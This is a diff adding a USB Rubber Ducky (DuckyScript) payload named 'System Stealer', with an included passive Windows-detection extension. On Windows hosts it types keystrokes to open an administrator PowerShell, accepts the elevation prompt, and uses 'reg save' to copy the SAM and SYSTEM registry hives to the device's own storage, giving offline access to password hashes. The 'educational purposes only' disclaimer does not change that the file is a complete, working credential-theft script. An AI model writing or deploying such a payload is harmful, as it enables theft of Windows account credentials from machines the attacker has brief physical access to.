@@ -1,0 +1,74 @@
+REM TITLE System Stealer
+REM AUTHOR mavisinator30001
+REM DESCRIPTION Creates a file in the Duck called sam.save and system.save with encrypted system information in both
+REM DISCLAIMER Neither I, nor Hak5, condone any unethical hacking practices, whether taken from this payload or otherwise!
+REM DISCLAIMER This is for educational purposes ONLY
+DELAY 1000
+ATTACKMODE HID STORAGE
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
+
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+REM Change $DRIVELABEL to the storage label of your duck
+DEFINE #DRIVELABEL DUCKY
+IF ($_OS == WINDOWS) THEN
+    GUI r
+    DELAY 500
+    STRING powershell
+    DELAY 1000
+    CTRL-SHIFT-ENTER
+    DELAY 750
+    LEFT
+    ENTER
+    DELAY 1000
+    STRINGLN $DriveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_LogicalDisk WHERE VolumeName='#DRIVELABEL'").DeviceID; Set-Variable -Name 'DriveLetter' -Value $DriveLetter -Scope Global; Write-Output $DriveLetter
+    DELAY 250
+    STRINGLN reg save HKLM\sam $DriveLetter/sam.save
+    WAIT_FOR_STORAGE_ACTIVITY
+    WAIT_FOR_STORAGE_INACTIVITY
+    STRINGLN reg save HKLM\system $DriveLetter/system.save
+    WAIT_FOR_STORAGE_ACTIVITY
+    WAIT_FOR_STORAGE_INACTIVITY
+    ALT F4
+ELSE
+    ATTACKMODE OFF
+    STOP_PAYLOAD
+END_IF
